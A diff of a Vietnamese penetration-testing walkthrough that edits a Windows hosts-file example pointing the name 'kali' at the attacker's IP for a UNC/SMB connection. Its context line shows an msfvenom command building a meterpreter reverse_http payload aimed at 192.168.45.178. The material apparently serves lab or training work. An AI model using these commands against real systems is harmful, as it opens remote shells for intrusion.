@@ -14,7 +14,10 @@ $ msfvenom -p windows/meterpreter/reverse_http HOST=192.168.45.178 LPORT=4343 -f
 Thay đổi file hosts trên máy Windows để tạo kết nối UNC sang máy tấn công.  
 Dùng notepad để thêm 1 dòng trong file hosts.
 ```
-<Địa chỉ IP>      kali
+# localhost name resolution is handled within DNS itself.
+#	127.0.0.1       localhost
+#	::1             localhost
+  <Địa chỉ IP>    kali
 ```
 
 Để tạo SMB server ([Nếu không có lệnh smbserver.py]())
